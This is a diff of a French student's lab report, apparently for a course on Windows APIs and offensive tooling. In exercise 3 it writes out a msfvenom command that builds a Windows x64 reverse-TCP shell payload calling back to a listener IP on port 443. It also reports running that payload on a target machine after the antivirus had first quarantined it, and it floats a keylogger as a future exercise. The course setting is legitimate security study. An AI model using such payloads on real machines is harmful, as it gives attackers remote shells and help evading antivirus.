@@ -24,14 +24,14 @@
 - Rien à ajouter, compréhension du code mis à disposition
 
 ## Exercices 3: 
-- Préparation d'un payload TCP reverse avec MSCVENOM : ** msfvenom LHOST=10.41.10.48 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp **
+- Préparation d'un payload TCP reverse avec MSCVENOM : ** msfvenom LHOST=10.41.10.48 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp ** 
 - Partage du programme compilé sur la machine cible et exécution après le démarrage de notepad.
-- Vérification de la connection sur la machine cible en powershell avec ** Get-NetTCPConnection ** mais le Reverse TCP ne semble pas fonctionner... Je vais continuer à investiguer mais après la date limite de remise des travaux. 
+- Vérification de la connection sur la machine cible en powershell avec ** Get-NetTCPConnection ** mais le Reverse TCP ne semble pas fonctionner... Je vais continuer à investiguer mais après la date limite de remise des travaux.  --> Pas adapter dans les programmes mais j'ai bien réussi à faire un Reverse TCP, le template Windows X64 avait été mis en quarantaine par mon antivirus.
 
 ## Exercices 3b
 - Rien à ajouter, compréhension du code mis à disposition
 
 ## Conclusion:
 - Travail trés intéressant qui permet de prendre ses marques avec les API et Windows en général.
-- Je pense qu'il serait intéressant de demander un nouveau produit plutôt que de reproduire ce qui a été fait, un keylogger par exemple ?
+- Je pense qu'il serait intéressant de demander un nouveau produit plutôt que de reproduire ce qui a été fait, un keylogger par exemple ? 
 - La limite du 25 Jan m'a forcé à rendre les travaux et à ne pas aller plus loin dans la découverte des payloads MSFVENOM TCP, je vais profiter de la dernière semaine sans cours pour approfondir cela hors du devoir.
